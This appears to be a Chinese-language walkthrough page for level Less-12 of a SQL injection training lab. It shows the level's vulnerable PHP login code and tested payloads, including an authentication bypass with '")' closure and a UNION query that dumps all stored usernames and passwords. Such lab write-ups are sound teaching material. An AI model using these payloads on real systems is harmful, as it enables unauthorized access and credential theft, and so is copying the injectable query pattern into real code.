# Less-12

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | POST · 报错型 |
| **闭合方式** | `")` |
| **成败信号** | 数据回显 + flag.jpg |
| **一句话** | 登录框，双引号加括号 |
| **核心 payload** | `uname=admin") --+` |

---

**POST · 报错型 · 双引号 + 括号**

### 源码

```php
$uname  = $_POST['uname'];
$passwd = $_POST['passwd'];
$uname  = '"' . $uname  . '"';      // 套双引号
$passwd = '"' . $passwd . '"';
$sql = "SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
```

和 Less-4 一个套路（双引号 + 括号），闭合用 **`")`**。

### 通关 payload（实测）

```
uname = admin") --+            →  成功  user=admin  pass=admin
uname = -1") union select 1,group_concat(username,0x3a,password) from users--+
→  13 条账号密码全部拖出
```

---

[← Less-11](Less-11.md) ｜ [返回目录](README.md) ｜ [Less-13 →](Less-13.md)